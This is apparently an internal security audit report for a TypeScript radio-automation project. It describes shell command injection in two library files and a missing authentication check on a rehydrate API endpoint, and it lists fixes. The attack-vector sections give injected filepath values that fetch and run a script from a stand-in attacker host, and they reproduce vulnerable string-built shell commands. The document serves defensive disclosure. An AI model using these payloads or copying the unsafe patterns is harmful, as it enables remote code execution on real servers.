# 🔥 CRITICAL VULNERABILITIES FOUND

**Date:** December 6, 2025  
**Severity:** CRITICAL - Command Injection Vulnerabilities

## 🚨 VULNERABILITY #1: libretimeDb.ts - Command Injection

**File:** `src/server/lib/libretimeDb.ts`  
**Lines:** 32, 35, 93, 96  
**Function:** `updateLibreTimeFileExists()` and `updateLibreTimeFileExistsBatch()`

### Issue
The `filepath` parameter is inserted directly into shell commands with only SQL escaping (single quotes). This does NOT protect against shell command injection.

**Vulnerable Code:**
```typescript
command = `PGPASSWORD='${LIBRETIME_DB_PASSWORD}' psql -h ${LIBRETIME_DB_HOST} -U ${LIBRETIME_DB_USER} -d ${LIBRETIME_DB_NAME} -c "UPDATE cc_files SET file_exists = ${existsValue} WHERE filepath = '${escapedPath}';"`
```

**Attack Vector:**
If `filepath` contains: `'; wget http://attacker.com/sex.sh -O /srv/payload/sex.sh; sh /srv/payload/sex.sh; '`
The command becomes:
```bash
psql ... -c "UPDATE cc_files SET file_exists = true WHERE filepath = ''; wget http://attacker.com/sex.sh -O /srv/payload/sex.sh; sh /srv/payload/sex.sh; '';"
```

**Where Called From:**
- `scripts/cron/preair_rehydrate.ts` (line 114) - Called from cron scripts
- Potentially from API endpoints that process episodes

### Fix Required
Use parameterized queries or proper shell escaping. The filepath should be validated to only contain safe characters.

---

## 🚨 VULNERABILITY #2: rsyncPull.ts - Command Injection

**File:** `src/server/lib/rsyncPull.ts`  
**Line:** 61  
**Function:** `rsyncPull()`

### Issue
The `srcArchivePath` and `dstWorkingPath` parameters are inserted into a bash command with only double quotes. This is vulnerable to command injection.

**Vulnerable Code:**
```typescript
const hostCmd = `bash "${scriptPath}" "${srcArchivePath}" "${dstWorkingPath}"`
```

**Attack Vector:**
If `srcArchivePath` contains: `"; wget http://attacker.com/sex.sh -O /srv/payload/sex.sh; sh /srv/payload/sex.sh; "`
The command becomes:
```bash
bash "/path/to/script.sh" "; wget http://attacker.com/sex.sh -O /srv/payload/sex.sh; sh /srv/payload/sex.sh; " "dst"
```

**Where Called From:**
- `scripts/lifecycle/rehydrateEpisode.ts` (line 16) - Called from rehydrate script
- `scripts/cron/preair_rehydrate.ts` - Called from cron
- `/api/lifecycle/rehydrate` endpoint (via rehydrateEpisode) - **NO AUTHENTICATION CHECK!**

### Fix Required
1. Validate paths to only contain safe characters (alphanumeric, `/`, `-`, `_`, `.`)
2. Use proper shell escaping or pass arguments via environment variables
3. Add authentication to `/api/lifecycle/rehydrate` endpoint

---

## 🚨 VULNERABILITY #3: /api/lifecycle/rehydrate - No Authentication

**File:** `src/server/api/lifecycle/rehydrate.ts`  
**Line:** 12-29

### Issue
The endpoint accepts `episodeId` from user input and calls `rehydrateEpisode()` which uses `rsyncPull()` with user-controlled paths. **NO AUTHENTICATION CHECK!**

**Vulnerable Code:**
```typescript
export async function POST(req: NextRequest) {
  const body = await req.json()
  const { episodeId, verify = false } = body
  // NO AUTH CHECK!
  const result = await rehydrateEpisode({ episodeId, verify, dryRun: false })
}
```

**Attack Vector:**
1. Attacker calls `/api/lifecycle/rehydrate` with malicious episodeId
2. Episode lookup might fail, but if episode exists with malicious filepath data
3. `rsyncPull()` is called with potentially malicious paths
4. Command injection executes

### Fix Required
Add authentication check using `checkScheduleAuth()`.

---

## 🔧 IMMEDIATE FIXES NEEDED

### Priority 1: Add Authentication
- [ ] Add authentication to `/api/lifecycle/rehydrate`
- [ ] Verify all endpoints calling vulnerable functions have auth

### Priority 2: Fix Command Injection
- [ ] Fix `libretimeDb.ts` - Use parameterized queries or proper escaping
- [ ] Fix `rsyncPull.ts` - Validate and sanitize paths
- [ ] Add path validation functions

### Priority 3: Add Rate Limiting
- [ ] Add rate limiting to all lifecycle endpoints
- [ ] Add rate limiting to rehydrate endpoint

### Priority 4: Add Disable Flags
- [ ] Add `ENABLE_DANGEROUS_ENDPOINTS` flag
- [ ] Temporarily disable vulnerable endpoints

---

## 📋 AUDIT CHECKLIST

- [x] Found all exec/spawn calls
- [x] Identified vulnerable functions
- [x] Traced call paths to API endpoints
- [ ] Fixed command injection vulnerabilities
- [ ] Added authentication to all vulnerable endpoints
- [ ] Added rate limiting
- [ ] Added path validation
- [ ] Tested fixes

---

**STATUS:** 🔴 CRITICAL VULNERABILITIES IDENTIFIED - IMMEDIATE ACTION REQUIRED

